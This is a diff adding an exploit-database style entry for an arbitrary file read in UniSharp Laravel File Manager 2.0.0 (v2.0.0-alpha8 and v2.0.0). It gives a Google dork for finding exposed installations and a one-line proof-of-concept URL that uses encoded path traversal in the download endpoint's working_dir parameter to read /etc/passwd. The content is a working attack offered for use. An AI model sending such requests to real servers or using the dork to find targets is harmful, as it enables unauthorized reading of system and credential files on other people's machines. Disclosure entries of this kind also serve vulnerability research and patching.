@@ -1,0 +1,13 @@
+# Exploit Title: UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read
+# Google Dork: inurl:"laravel-filemanager?type=Files" -site:github.com -site:github.io
+# Date: 2020-02-04
+# Exploit Author: NgoAnhDuc
+# Vendor Homepage: https://github.com/UniSharp/laravel-filemanager
+# Software Link: https://github.com/UniSharp/laravel-filemanager
+# Version: v2.0.0-alpha8 & v2.0.0
+# Tested on: v2.0.0-alpha8 & v2.0.0
+# CVE : N/A
+
+PoC:
+
+http://localhost/laravel-filemanager/download?working_dir=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2F&type=&file=passwd
